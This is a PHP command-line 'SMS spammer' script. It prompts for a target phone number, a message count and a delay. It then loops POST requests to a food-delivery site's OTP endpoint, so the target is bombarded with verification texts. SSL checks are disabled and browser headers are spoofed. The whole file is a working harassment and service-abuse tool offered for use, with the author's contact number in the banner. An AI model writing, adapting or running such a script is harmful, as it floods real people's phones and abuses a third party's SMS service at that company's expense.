<?php
/* 
SPAMMER SMS PHD
Script By : V1O7EY
*/
@ini_set('output_buffering',0);
function phd($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://www.phd.co.id/en/users/sendOTP");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone_number=".$no);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'https://www.phd.co.id/en/users/createnewuser');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
echo "
||########################$$$||
||  Spamer By : V1O7ET       ||     ||  Record By : V1O7ET       ||           ||  Fb Me : Rud Az           ||
||  Contact Me : 085730882379||                      ||###########################||                          \n\n";
echo "Nomor Target\08xxxxx : ";
$nomor = trim(fgets(STDIN));
echo "Jumlah Sms\99999 : ";
$jumlah = trim(fgets(STDIN));
echo "Jeda Waktu (ex:1)\1-5 : ";
$jeda = trim(fgets(STDIN));
$execute = phd($nomor, $jumlah, $jeda);
print $execute;
?>